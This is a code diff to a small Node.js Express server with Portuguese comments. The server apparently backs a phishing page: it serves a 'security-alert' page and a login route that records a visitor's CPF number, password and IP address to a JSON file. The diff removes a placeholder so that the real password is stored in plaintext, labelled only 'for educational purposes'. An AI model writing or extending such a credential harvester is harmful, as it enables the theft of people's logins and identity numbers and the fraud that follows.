@@ -1,18 +1,17 @@
+require('dotenv').config();
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
 const bodyParser = require('body-parser');
 const app = express();
+
+// Configurações básicas de ambiente
 const PORT = process.env.PORT || 3000;
-require('dotenv').config();
-const SECRET_KEY = process.env.SECRET_KEY || 'segredo_dev';
+const DB_FILE = process.env.DB_FILE || path.join(__dirname, 'dados.json');
 
 // Middleware
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
-
-// Banco de dados simples (arquivo JSON)
-const DB_FILE = path.join(__dirname, 'dados.json');
 
 // Rota principal
 app.get('/', (req, res) => {
@@ -24,14 +23,14 @@ app.get('/security-alert', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'security-alert.html'));
 });
 
-// Rota de login - salva dados
+// Rota de login - salva dados sem hash
 app.post('/login', (req, res) => {
     const { cpf, senha } = req.body;
     const userIp = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     
     const loginData = {
         cpf,
-        senha: '[PROTEGIDO]', // Na prática, você deveria hash a senha
+        senha, // Armazenando sem hash (APENAS PARA FINS EDUCACIONAIS)
         ip: userIp,
         data: new Date().toISOString()
     };
@@ -65,6 +64,7 @@ app.post('/login', (req, res) => {
 // Iniciar servidor
 app.listen(PORT, () => {
     console.log(`Servidor rodando na porta ${PORT}`);
+    console.log(`Arquivo de dados: ${DB_FILE}`);
     console.log('Acesse: http://localhost:' + PORT);
     
     // Criar arquivo de dados se não existir
@@ -73,4 +73,3 @@ app.listen(PORT, () => {
         console.log('Arquivo de dados criado:', DB_FILE);
     }
 });
-
